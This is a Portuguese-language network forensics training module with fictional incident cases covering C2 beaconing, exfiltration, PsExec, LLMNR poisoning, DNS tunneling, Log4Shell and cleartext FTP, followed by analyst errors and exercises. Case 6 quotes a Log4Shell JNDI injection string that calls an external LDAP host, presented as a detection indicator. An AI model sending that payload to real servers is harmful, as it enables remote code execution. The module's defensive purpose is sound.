# Casos de Uso e Erros Comuns em Rede

> **Objetivo pedagógico:** consolidar o aprendizado de forense de rede com cenários corporativos realistas, os erros mais frequentes, suas consequências e as medidas de prevenção.

Os casos são fictícios e destinados ao treinamento.

## 1. Caso 1: beaconing de C2 a partir de uma estação

**Pergunta:** há comunicação de comando e controle partindo da estação 10.1.2.3?

| Fonte | Achado |
|---|---|
| `conn.log` | 1.400 conexões em 24 h ao IP 203.0.113.50:443, a cada 60 s, com coeficiente de variação de 0,08 |
| `ssl.log` | SNI genérico e JA3 raro na organização (2 hosts) |
| `x509.log` | Certificado emitido havia 3 dias, sujeito genérico |
| DNS | Domínio registrado havia 5 dias |
| EDR | Processo `svc.exe` em `C:\ProgramData` originando as conexões |
| Resposta | Isolamento da estação, bloqueio do destino, busca do mesmo JA3 em outros hosts e análise do binário |

**Lição:** periodicidade, raridade do JA3 e idade da infraestrutura, corroboradas pelo EDR, sustentam a conclusão sem decriptar o tráfego.

## 2. Caso 2: exfiltração por HTTPS para armazenamento em nuvem

| Fonte | Achado |
|---|---|
| NetFlow e `conn.log` | 11 GB enviados em 35 minutos de um servidor de arquivos a um IP de provedor de armazenamento, às 03:05Z |
| Perfil | `orig_bytes` muito maior que `resp_bytes`; destino nunca visto antes para o servidor |
| Proxy | Servidor sem proxy configurado: acesso direto |
| Endpoint | Criação de arquivo compactado de 11 GB minutos antes, pelo usuário de serviço |
| Resposta | Bloqueio do destino, preservação, notificação ao Jurídico e ao DPO, e avaliação dos dados |

**Lição:** a assimetria de volume e a primeira ocorrência do destino são sinais fortes; confirme os dados no endpoint.

## 3. Caso 3: movimentação lateral por SMB (PsExec)

| Fonte | Achado |
|---|---|
| PCAP no núcleo | Estação 10.1.2.30 conectando-se por SMB a 9 servidores em 12 minutos, às 02:14Z |
| SMB | Acesso a `\\servidor\ADMIN$`, escrita de `PSEXESVC.exe` e uso do pipe `svcctl` |
| NTLM | `svc_backup` do domínio `CORP` autenticando-se de uma estação |
| Servidores (EVTX) | 4624 tipo 3 e 7045 de `PSEXESVC` |
| Resposta | Redefinição das credenciais, isolamento da estação de origem e verificação dos 9 servidores |

**Lição:** o PCAP mostra o movimento; os logs dos servidores confirmam o sucesso; combine as fontes.

## 4. Caso 4: envenenamento de LLMNR e captura de hashes

| Fonte | Achado |
|---|---|
| `dns.log` e captura | Consultas LLMNR e NBT-NS por nomes inexistentes (erros de digitação) de várias estações |
| Respostas | Um único host (10.1.9.77) respondendo a todas as consultas |
| NTLM | Autenticações NTLM das estações ao host 10.1.9.77 |
| Endpoint | O host 10.1.9.77 era um notebook de visitante com uma ferramenta de envenenamento |
| Resposta | Remoção do dispositivo, desativação de LLMNR e NBT-NS por política e redefinição de credenciais afetadas |

**Lição:** um host respondendo a todas as consultas de nomes é um indício forte; desative protocolos desnecessários.

## 5. Caso 5: túnel DNS

| Fonte | Achado |
|---|---|
| `dns.log` | Um servidor consultando 18 mil subdomínios aleatórios de um único domínio em 2 horas |
| Características | Rótulos longos de alta entropia e registros TXT |
| EDR | Processo `svc.exe` realizando as consultas |
| Conclusão | Exfiltração ou C2 por túnel DNS (T1071.004 e T1048); bloqueio e isolamento |

**Lição:** o volume por domínio de segundo nível e a entropia dos rótulos revelam o túnel (ver pasta 11).

## 6. Caso 6: exploração de Log4Shell observada em PCAP

| Fonte | Achado |
|---|---|
| `http.log` | Requisições com `${jndi:ldap://203.0.113.9:1389/a}` no URL e no user-agent |
| Rede | Conexão de saída do servidor ao IP 203.0.113.9:1389 (LDAP) logo depois |
| Segundo estágio | O servidor baixa uma classe Java do mesmo IP |
| Endpoint | Processo Java criando um shell filho |
| Conclusão | Exploração bem-sucedida (conexão de saída e comportamento posterior); confiança alta |

**Lição:** distinga tentativa de exploração de exploração bem-sucedida pela resposta de rede e pelo comportamento posterior.

## 7. Caso 7: envio de dados por FTP em texto claro

| Fonte | Achado |
|---|---|
| PCAP | Sessão FTP de um servidor de aplicação a um IP externo, com `USER` e `PASS` em texto claro |
| Conteúdo | Transferência de arquivos CSV com dados de clientes |
| Autoria | Conta de serviço de integração (legítima) enviando a destino não aprovado |
| Resposta | Revogar a credencial, avaliar o impacto à luz da LGPD e substituir o fluxo por transferência segura |

**Lição:** protocolos em texto claro entregam conteúdo e credenciais; use captura para estimar o impacto e a comunicação necessária.

## 8. Erros comuns, consequências e prevenção

| Erro | Consequência provável | Prevenção |
|---|---|---|
| Capturar sem documentar filtro, `snaplen` e perdas | Conclusões sem base e incapacidade de explicar lacunas | Registro de captura e `capinfos` |
| Capturar sem autorização ou além do escopo | Violação de sigilo e ilicitude | Autorização, DPO e minimização |
| Analisar sem hash e sem cópia de trabalho | Alteração e contestação | Hash e trabalho em cópia |
| Abrir capturas suspeitas em estação comum | Exploração de falhas de dissectores | VM isolada e ferramentas atualizadas |
| Não configurar a exibição em UTC | Erros de correlação | UTC e documentação do fuso e do desvio |
| Confundir filtros de captura (BPF) e de exibição | Dados perdidos ou resultados incorretos | Entender a diferença e registrar os filtros |
| Tratar JA3 como prova de identidade | Falsos positivos ou negativos | Usar como indício, com corroboração |
| Concluir pela ausência de atividade por falta de captura | Falso negativo | Declarar pontos cegos e usar outras fontes |
| Ignorar tráfego leste-oeste | Movimentação lateral não detectada | Cobertura no núcleo e logs de endpoint |
| Executar arquivos extraídos fora de ambiente isolado | Infecção | Laboratório isolado e análise estática primeiro |
| Decriptar tráfego sem base legal e sem política | Violação de privacidade | Parecer do Jurídico e do DPO |
| Depender apenas de alertas do IDS | Visibilidade limitada pelas regras | Metadados, fluxos e caça |
| Esquecer NAT, DHCP e proxies na atribuição de IPs | Dispositivo ou usuário errado | Correlacionar com DHCP, NAT e proxy |
| Deixar a captura sobrescrever dados antes de preservar | Perda irreversível | Rotação com limite adequado e captura sob demanda |

## 9. Exercícios práticos

1. Baixe uma captura de exemplo (Malware-Traffic-Analysis.net ou Wireshark SampleCaptures), registre o hash, gere os logs do Zeek e identifique as principais conversas.
2. Escreva três filtros de exibição para encontrar consultas DNS suspeitas, downloads de executáveis e acessos a `ADMIN$`.
3. Extraia objetos HTTP de uma captura, calcule os hashes e preencha o registro de arquivos extraídos.
4. Calcule o coeficiente de variação dos intervalos de conexões entre um par de hosts em uma captura de exercício e avalie se há beaconing.
5. Processe um PCAP com Suricata, liste os alertas com `jq` e valide dois deles na própria captura.
6. Elabore o relatório de análise de rede para o caso 3, com linha do tempo, IOCs e recomendações de visibilidade.

## 10. Normas e frameworks relevantes

- MITRE ATT&CK: T1040, T1046, T1071, T1557.001, T1558.003, T1021.002, T1041, T1048, T1190, T1105
- NIST SP 800-86; NIST SP 800-94; NIST SP 800-61 Rev. 3
- CIS Controls v8.1, controle 13
- LGPD, arts. 6º, 7º, 46 e 48

## 11. Referências

- Davidoff, S.; Ham, J. Network Forensics: Tracking Hackers through Cyberspace. Prentice Hall, 2012.
- Sanders, C. Practical Packet Analysis. 3. ed. 2017.
- Sanders, C.; Smith, J. Applied Network Security Monitoring. 2013.
- Malware-Traffic-Analysis.net (Brad Duncan): capturas e relatórios.
- The DFIR Report. Relatórios públicos de intrusões.
- MITRE ATT&CK. https://attack.mitre.org
- SANS Institute. FOR572: Advanced Network Forensics.
